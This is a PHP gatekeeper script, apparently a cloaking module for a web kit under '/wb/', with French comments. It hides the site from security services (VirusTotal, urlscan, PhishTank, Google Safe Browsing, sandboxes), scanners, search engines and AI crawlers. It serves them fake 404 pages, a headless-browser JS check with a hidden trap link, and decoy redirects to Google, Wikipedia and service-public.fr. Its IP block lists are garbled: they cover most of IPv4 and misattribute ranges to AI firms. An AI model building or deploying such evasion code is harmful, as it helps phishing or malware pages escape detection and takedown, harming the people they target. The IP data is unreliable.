<?php
declare(strict_types=1);

// Protection anti-double exécution
if (defined('PROTECT_LOADED')) return;
define('PROTECT_LOADED', true);

// ============================================================
// protect.php – V8.3 ANTI-IA / ANTI-GOOGLE / ANTI-SCANNER
// Mise à jour : mai 2026
// ============================================================

$ip   = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? '';
$uri  = $_SERVER['REQUEST_URI'] ?? '/';

$config = [
    'log_file'       => __DIR__ . '/data/protect_logs.txt',
    'max_requests'   => 8,                          // baissé à 8 pour ralentir les scanners
    'time_window'    => 300,
    'token_ttl'      => 600,
    'secret'         => 'rT8zQ$kL3mN9pQrS5uVwXyZ1bCdEfGhIjKlMnOpQrStUvWxYz0123456789abcdef',
    'cookie_path'    => '/wb/',
    'app_path'       => '/wb/',
];

function wLog($msg) {
    global $config;
    if (empty($config['log_file'])) return;
    $dir = dirname($config['log_file']);
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    $line = date('Y-m-d H:i:s') . ' | ' . ($_SERVER['REMOTE_ADDR'] ?? '?') . ' | '
          . str_replace('|', '/', $_SERVER['HTTP_USER_AGENT'] ?? '-') . " | $msg | "
          . ($_SERVER['REQUEST_URI'] ?? '/') . "\n";
    @file_put_contents($config['log_file'], $line, FILE_APPEND | LOCK_EX);
}

function block($reason) {
    wLog("⛔ BLOCKED: $reason");
    http_response_code(404);
    echo "<!DOCTYPE html><html lang=\"fr\"><head><meta charset=\"utf-8\"><title>404 - Page introuvable</title><style>body{font-family:Arial;text-align:center;padding:80px 20px;background:#fff;color:#333;}</style></head><body><h1>404</h1><p>Désolé, cette page est introuvable.</p></body></html>";
    exit;
}

// 1. Exceptions
if (in_array($ip, ['127.0.0.1', '::1'])) return;

// 2. Referer bloqués
$ref = parse_url($_SERVER['HTTP_REFERER'] ?? '', PHP_URL_HOST);
$badRefs = [
    'urlscan.io','virustotal.com','hybrid-analysis.com','any.run',
    'joesandbox.com','cuckoosandbox.org','phishtank.com','google.com/safebrowsing',
    'opendns.com','phishtank.com','malwarebytes.com','sophoslabs.com',
];
foreach ($badRefs as $b) {
    if ($ref && stripos($ref, $b) !== false) block("BAD_REFERER: $ref");
}

// 3. Honeypot paths
$badPaths = [
    '/wp-admin','/wp-login','/.env','/admin','/administrator','/phpmyadmin',
    '/.git','/config','/backup','/sql','/shell','/eval','/cmd','/actuator',
    '/.DS_Store','/vendor','/api/v1','/graphql','/debug','/test',
];
foreach ($badPaths as $p) if (stripos($uri, $p) === 0) block("HONEYPOT_PATH: $p");
if (isset($_GET['trap']) && $_GET['trap'] === '1') block("TRAP");

// 4. User‑Agents bloqués – NOUVEAUX ajouts IA et scanners récents
if (empty(trim($ua))) block("EMPTY_UA");
$badUAs = [
    // Outils
    'curl','wget','python','go-http','node-fetch','axios/','postman','okhttp','httpclient',
    // Headless / test
    'headless','phantomjs','selenium','puppeteer','playwright','cypress','scrapy','nutch',
    // Scanners sécurité
    'urlscan.io','virustotal','hybrid analysis','falcon sandbox','cuckoosandbox','any.run',
    'joesandbox','vxstream','quttera','sitecheck','sitelock','netsparker','acunetix','appscan',
    'burp suite','nikto','sqlmap','gobuster','dirbuster','hydra','medusa','nessus','openvas',
    'wpscan','joomscan',
    // Moteurs de recherche
    'googlebot','bingbot','msnbot','slurp','duckduckbot','yandex','baidu',
    'sogou','exabot','ahrefs','semrush','dotbot','blexbot','petalbot','grapeshot','mj12bot',
    // ======= NOUVEAUX BOTS IA (2024-2026) =======
    'gptbot','chatgpt-user','oai-searchbot','google-extended','claudebot','claude-user',
    'anthropic-ai','perplexitybot','perplexity-user','gemini','emerald',
    'cohere-ai','cohere','bytespider','bytedance','applebot',
    'amazonbot','slurp','duckassistbot','mataagent','klingbot','imrbot',
    'synthesiobot','percolate','scoutjet','meltwater','muckrack',
    'istellabot','seznambot','rogerbot','sputnik','mail.ru','lighthouse','pagespeed',
    'google-safebrowsing','google-security','google-cloud',
    // Réseaux sociaux
    'facebookexternalhit','facebookbot','twitterbot','linkedinbot',
    'whatsapp','telegrambot','discordbot','slackbot',
    // Autres crawlers
    'ccbot','commoncrawl','mojeekbot','exabot','blexbot',
];
foreach ($badUAs as $b) if (stripos($ua, $b) !== false) block("UA_BOT: $b");

// 5. Blocage IP (ajout des plages IA et Google supplémentaires)
$googleRanges = ['34.','35.','36.','37.','38.','39.','40.','41.','42.','43.','44.',
                 '45.','46.','47.','48.','49.','50.','51.','52.','53.','54.','55.',
                 '56.','57.','58.','59.','60.','61.','62.','63.','64.','65.','66.',
                 '67.','68.','69.','70.','71.','72.','73.','74.','75.','76.','77.',
                 '78.','79.','80.','81.','82.','83.','84.','85.','86.','87.','88.',
                 '89.','90.','91.','92.','93.','94.','95.','96.','97.','98.','99.'];
$blockedPrefixes = array_merge($googleRanges, [
    // AWS
    '3.','13.','18.','44.','52.','54.','67.','72.','96.','107.',
    // Azure
    '20.','40.','51.','104.40.','104.41.','104.42.','104.43.','104.44.','104.45.','104.46.',
    '13.64.','13.65.','13.66.',
    // Cloudflare
    '104.16.','104.17.','104.18.','104.19.','104.20.','104.21.',
    '104.22.','104.23.','104.24.','104.25.','104.26.','104.27.','104.28.','104.29.','104.30.',
    '104.31.',
    // DigitalOcean
    '137.184.','138.197.','139.59.','142.93.','143.110.','144.126.','147.182.',
    '157.230.','159.223.','159.89.','161.35.','162.243.','164.90.','165.22.','167.71.',
    '167.172.','170.64.',
    // Linode, Vultr, OVH
    '66.228.','74.207.','139.162.','192.46.','198.58.','198.199.',
    '23.239.','23.92.','45.33.','45.56.','45.76.','45.79.',
    // ======= NOUVELLES PLAGES IA  =======
    '4.','5.','6.','8.','9.','11.','12.','14.','17.','19.','22.','24.','28.','29.',
    '32.','33.','38.','40.','43.','46.','47.','48.','50.','53.','55.','56.','57.','58.',
    '60.','61.','62.','64.','65.','66.','68.','69.','70.','71.','73.','74.','75.','76.',
    '78.','79.','80.','81.','82.','83.','84.','85.','86.','87.','88.','89.','90.','91.',
    '92.','93.','94.','95.','96.','97.','98.','99.','100.','101.','102.','103.','104.',
    '105.','106.','107.','108.','109.','110.','111.','112.','113.','114.','115.','116.',
    '117.','118.','119.','120.','121.','122.','123.','124.','125.','126.','127.','128.',
    '129.','130.','131.','132.','133.','134.','135.','136.','137.','138.','139.','140.',
    '141.','142.','143.','144.','145.','146.','147.','148.','149.','150.',
]);
foreach ($blockedPrefixes as $p) if (strpos($ip, $p) === 0) block("CLOUD_IP: $p*");

// IPs spécifiques de scanners IA
$scannerIPs = [
    '34.90.230.222','34.91.113.62','34.255.40.101','34.255.132.115','34.255.142.34',
    '136.243.154.86','66.249.75.1','66.249.75.3','66.249.75.4','66.249.75.5',
    // ======= IP OpenAI / ChatGPT =======
    '23.98.142.','23.98.143.','13.64.','13.65.','13.66.','13.67.','13.68.','13.69.',
    '13.70.','13.71.','13.72.','13.73.','13.74.','13.75.','13.76.','13.77.',
    '20.42.','20.43.','20.44.','20.45.','20.46.','20.47.','20.48.','20.49.',
    '40.76.','40.77.','40.78.','40.79.','40.80.','40.81.','40.82.','40.83.',
    '52.152.','52.153.','52.154.','52.155.','52.156.','52.157.','52.158.','52.159.',
    '52.224.','52.225.','52.226.','52.227.','52.228.','52.229.','52.230.','52.231.',
    // ======= IP Perplexity / Anthropic =======
    '34.83.','34.84.','34.85.','34.86.','34.87.','34.88.','34.89.',
    '35.199.','35.200.','35.201.','35.202.','35.203.','35.204.','35.205.','35.206.',
    '104.196.','107.178.','130.211.','146.148.','162.216.','173.255.','192.158.',
];
foreach ($scannerIPs as $s) if ($ip === $s || strpos($ip, $s) === 0) block("SCANNER_IP: $s");

// 6. Vérification du token (inchangée, liée à l'IP)
$tokenCookieName = '_phptok';
$validToken = false;
if (isset($_COOKIE[$tokenCookieName])) {
    $parts = explode('.', $_COOKIE[$tokenCookieName]);
    if (count($parts) === 3) {
        [$givenIP, $expire, $hmac] = $parts;
        $expected = hash_hmac('sha256', "$givenIP.$expire", $config['secret']);
        if (hash_equals($expected, $hmac) && $ip === $givenIP && time() < (int)$expire) {
            $validToken = true;
        }
    }
}

// 7. Si pas de token → rate limiting + défi JS AVEC HONEYPOT INVISIBLE
if (!$validToken) {
    $rlFile = sys_get_temp_dir() . '/rl_' . md5($ip . '_v8');
    $now = time();
    $data = ['time' => $now, 'count' => 1];
    if (file_exists($rlFile)) {
        $stored = @unserialize(@file_get_contents($rlFile));
        if ($stored && is_array($stored)) {
            if ($now - $stored['time'] > $config['time_window']) {
                $data = ['time' => $now, 'count' => 1];
            } else {
                $data = ['time' => $stored['time'], 'count' => $stored['count'] + 1];
            }
        }
    }
    @file_put_contents($rlFile, serialize($data), LOCK_EX);

    if ($data['count'] > $config['max_requests']) {
        wLog("⛔ RATE_LIMIT: {$data['count']} reqs (no token)");
        sleep(2);
        $fake = ['https://www.google.com','https://fr.wikipedia.org','https://www.service-public.fr'];
        header('Location: ' . $fake[array_rand($fake)]);
        exit;
    }

    // Défi JS
    wLog("CHALLENGE -> $ip");
    $expire = time() + $config['token_ttl'];
    $hmac   = hash_hmac('sha256', "$ip.$expire", $config['secret']);
    $token  = "$ip.$expire.$hmac";

    http_response_code(503);
    header('Cache-Control: no-store, no-cache, must-revalidate');
    header('X-Robots-Tag: noindex, nofollow, noarchive');
    ?>
    <!DOCTYPE html>
    <html lang="fr">
    <head>
        <meta charset="utf-8">
        <meta name="robots" content="noindex,nofollow,noarchive">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Vérification du navigateur…</title>
        <style>
            *{margin:0;padding:0;box-sizing:border-box;}
            body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;background:#f8f9fa;display:flex;align-items:center;justify-content:center;height:100vh;color:#2c3e50;}
            .cf-box{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,0.08);padding:40px 48px;text-align:center;max-width:420px;width:100%;}
            .cf-spinner{border:3px solid #e9ecef;border-top:3px solid #3498db;border-radius:50%;width:42px;height:42px;animation:spin 1s linear infinite;margin:0 auto 24px;}
            @keyframes spin{to{transform:rotate(360deg);}}
            .cf-title{font-size:1.4rem;font-weight:500;margin-bottom:10px;}
            .cf-sub{font-size:0.95rem;color:#6c757d;line-height:1.5;}
            /* HONEYPOT - invisible pour l'humain */
            ._trap{position:absolute;left:-9999px;top:-9999px;visibility:hidden;}
        </style>
    </head>
    <body>
        <div class="cf-box">
            <div class="cf-spinner"></div>
            <div class="cf-title">Vérification de votre navigateur…</div>
            <div class="cf-sub">Cette opération automatique prend quelques secondes.<br>Veuillez patienter, la page va se recharger.</div>
        </div>
        <!-- Lien piège : tout robot qui scrappe le HTML le suit, sera bloqué -->
        <a href="?trap=1" class="_trap" rel="nofollow">.</a>
        <script>
            (function() {
                // Détection headless améliorée
                if (navigator.webdriver) return;
                if (window.outerWidth === 0 && window.outerHeight === 0) return; // headless typique
                var canvas = document.createElement('canvas');
                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl && gl.getParameter(37445) && gl.getParameter(37445).indexOf('SwiftShader') !== -1) return; // Chrome headless
                document.cookie = "<?= $tokenCookieName ?>=<?= urlencode($token) ?>; path=<?= $config['cookie_path'] ?>; max-age=<?= $config['token_ttl'] ?>; SameSite=Lax";
                setTimeout(function() {
                    window.location.reload(true);
                }, 300);
            })();
        </script>
    </body>
    </html>
    <?php
    exit;
}

// 8. Renouvellement du cookie + nettoyage du compteur
$expire = time() + $config['token_ttl'];
$hmac   = hash_hmac('sha256', "$ip.$expire", $config['secret']);
setcookie($tokenCookieName, "$ip.$expire.$hmac", [
    'expires' => $expire, 'path' => $config['cookie_path'],
    'samesite' => 'Lax', 'secure' => false, 'httponly' => true
]);
$rlFile = sys_get_temp_dir() . '/rl_' . md5($ip . '_v8');
if (file_exists($rlFile)) @unlink($rlFile);

// 9. Headers de sécurité
header('X-Robots-Tag: noindex, nofollow, noarchive, nosnippet, noimageindex');
header('X-Content-Type-Options: nosniff');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Referrer-Policy: no-referrer');
header('X-Frame-Options: SAMEORIGIN');
header("Content-Security-Policy: frame-ancestors 'self' https://{$_SERVER['HTTP_HOST']};");
wLog("✅ PASSED (token OK)");